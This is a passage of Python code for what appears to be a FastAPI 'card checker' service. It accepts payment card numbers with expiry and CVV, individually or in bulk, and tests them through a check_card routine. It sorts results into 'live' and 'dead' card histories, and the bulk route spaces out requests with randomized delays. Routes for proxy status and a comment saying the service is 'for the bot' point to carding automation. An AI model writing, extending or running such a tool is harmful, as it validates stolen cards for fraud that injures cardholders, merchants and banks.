        return JSONResponse(status_code=401, content={"error":"INVALID_KEY"})
    return proxy_mgr.status()


@app.get("/stats")
def stats_get(key: str = ""):
    if key != API_KEY:
        return JSONResponse(status_code=401, content={"error":"INVALID_KEY"})
    with _hist_lock:
        return {"global": dict(_stats), "hourly": dict(_hourly)}


@app.get("/history/live")
def live_hist(key: str = ""):
    if key != API_KEY:
        return JSONResponse(status_code=401, content={"error":"INVALID_KEY"})
    with _hist_lock:
        return {"cards": list(_live_history)}


@app.get("/history/dead")
def dead_hist(key: str = ""):
    if key != API_KEY:
        return JSONResponse(status_code=401, content={"error":"INVALID_KEY"})
    with _hist_lock:
        return {"cards": list(_dead_history)}


@app.get("/logs")
def logs_get(key: str = ""):
    if key != API_KEY:
        return JSONResponse(status_code=401, content={"error":"INVALID_KEY"})
    with _hist_lock:
        return {"logs": list(_logs)}


@app.get("/duplicate/clear")
def clear_dup_get(key: str = ""):
    if key != API_KEY:
        return JSONResponse(status_code=401, content={"error":"INVALID_KEY"})
    clear_duplicates()
    return {"status":"cleared"}


# ─────────────────────────────────────────
# POST ROUTES — bot ke liye
# ─────────────────────────────────────────

@app.post("/check")
async def check_post(request: Request):
    key = request.headers.get("x-api-key","")
    if key != API_KEY:
        return JSONResponse(status_code=401, content={"error":"INVALID_KEY"})
    if is_rate_limited(key):
        return JSONResponse(status_code=429, content={"error":"RATE_LIMIT_EXCEEDED"})
    try:
        body = await request.json()
        cc    = body.get("cc","")
        month = body.get("month","")
        year  = body.get("year","")
        cvv   = body.get("cvv","")
    except Exception:
        return JSONResponse(status_code=400, content={"error":"BAD_JSON"})

    ok, reason = validate_card(cc, month, year, cvv)
    if not ok:
        return {"cc":f"{cc}|{month}|{year}|{cvv}","Response":reason,"Status":False,"Time":"0.00s"}

    if is_duplicate(cc):
        return {"cc":f"{cc}|{month}|{year}|{cvv}","Response":"DUPLICATE_CARD","Status":False,"Time":"0.00s"}

    start   = time.time()
    res     = check_card(cc, month, year, cvv)
    elapsed = time.time() - start
    out     = format_resp(cc, month, year, cvv, res, elapsed)
    record(out["cc"], res, elapsed)
    return out


@app.post("/bulk")
async def bulk_post(request: Request):
    key = request.headers.get("x-api-key","")
    if key != API_KEY:
        return JSONResponse(status_code=401, content={"error":"INVALID_KEY"})
    try:
        body  = await request.json()
        cards = body.get("cards",[])
        delay = float(body.get("delay",1.2))
    except Exception:
        return JSONResponse(status_code=400, content={"error":"BAD_JSON"})

    results = []
    for line in cards:
        try:
            p = line.strip().split("|")
            if len(p) != 4:
                results.append({"cc":line,"Response":"BAD_FORMAT","Status":False})
                continue
            cc, month, year, cvv = p
            ok, reason = validate_card(cc, month, year, cvv)
            if not ok:
                results.append({"cc":line,"Response":reason,"Status":False})
                continue
            if is_duplicate(cc):
                results.append({"cc":line,"Response":"DUPLICATE_CARD","Status":False})
                continue
            start   = time.time()
            res     = check_card(cc, month, year, cvv)
            elapsed = time.time() - start
            out     = format_resp(cc, month, year, cvv, res, elapsed)
            record(out["cc"], res, elapsed)
            results.append(out)
            time.sleep(delay + random.uniform(0, 0.3))
        except Exception as e:
            results.append({"cc":line,"Response":str(e),"Status":False})

    return {
        "total":   len(results),
        "live":    sum(1 for r in results if r.get("Status")),
        "dead":    sum(1 for r in results if not r.get("Status")),
        "results": results,
    }
